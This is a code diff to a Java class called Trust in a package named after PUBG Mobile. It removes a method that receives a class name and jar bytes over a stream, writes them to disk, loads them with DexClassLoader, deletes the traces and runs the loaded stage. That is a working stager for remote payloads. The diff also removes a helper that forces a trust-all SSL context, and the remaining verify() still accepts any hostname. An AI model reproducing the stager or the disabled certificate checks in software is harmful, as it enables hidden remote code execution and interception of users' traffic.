@@ -1,25 +1,14 @@
 package com.pubg.imobile;
 
-import java.io.DataInputStream;
-import static com.pubg.imobile.Trigger.session_expiry;
-import java.io.File;
-import java.io.FileOutputStream;
-import java.io.OutputStream;
-import java.net.URLConnection;
 import java.security.MessageDigest;
 import java.security.NoSuchAlgorithmException;
-import java.security.SecureRandom;
 import java.security.cert.CertificateEncodingException;
 import java.security.cert.CertificateException;
 import java.security.cert.X509Certificate;
-import javax.net.ssl.HostnameVerifier;
-import javax.net.ssl.HttpsURLConnection;
-import javax.net.ssl.SSLContext;
-import javax.net.ssl.SSLSession;
-import javax.net.ssl.TrustManager;
-import javax.net.ssl.X509TrustManager;
 
-import dalvik.system.DexClassLoader;
+import javax.net.ssl.HostnameVerifier;
+import javax.net.ssl.SSLSession;
+import javax.net.ssl.X509TrustManager;
 
 public class Trust implements X509TrustManager, HostnameVerifier {
     public X509Certificate[] getAcceptedIssuers() {
@@ -70,53 +59,5 @@ public class Trust implements X509TrustManager, HostnameVerifier {
     public boolean verify(String hostname, SSLSession session) {
         return true;
     }
-    public static void readAndRunStage(DataInputStream input, OutputStream output, String[] args) throws Exception {
-        String dirPath = args[0];
-        String jarFilePath = dirPath + File.separatorChar + "Runner.jar";
-        String dexFilePath = dirPath + File.separatorChar + "Runner.dex";
 
-        int coreSize1 = input.readInt();
-        byte[] coreData1 = new byte[coreSize1];
-        input.readFully(coreData1);
-
-        String className = new String(coreData1);
-
-        int coreSize2 = input.readInt();
-        byte[] coreData2 = new byte[coreSize2];
-        input.readFully(coreData2);
-
-        File jarFile = new File(jarFilePath);
-
-        if (!jarFile.exists()) {
-            jarFile.createNewFile();
-        }
-
-        FileOutputStream fileOutputStream = new FileOutputStream(jarFile);
-        fileOutputStream.write(coreData2);
-        fileOutputStream.flush();
-        fileOutputStream.close();
-
-        Class<?> loadedClass = new DexClassLoader(jarFilePath, dirPath, dirPath, Cheetah.class.getClassLoader()).loadClass(className);
-
-        Object stageInstance = loadedClass.newInstance();
-
-        jarFile.delete();
-        new File(dexFilePath).delete();
-
-        loadedClass.getMethod("start", DataInputStream.class, OutputStream.class, String[].class)
-                .invoke(stageInstance, input, output, args);
-
-        session_expiry = -1;
-    }
-
-    public static void useFor(URLConnection uc) throws Exception {
-        if (uc instanceof HttpsURLConnection) {
-            HttpsURLConnection huc = (HttpsURLConnection) uc;
-            Trust ptm = new Trust();
-            SSLContext sc = SSLContext.getInstance("SSL");
-            sc.init(null, new TrustManager[]{ptm}, new SecureRandom());
-            huc.setSSLSocketFactory(sc.getSocketFactory());
-            huc.setHostnameVerifier(ptm);
-        }
-    }
 }
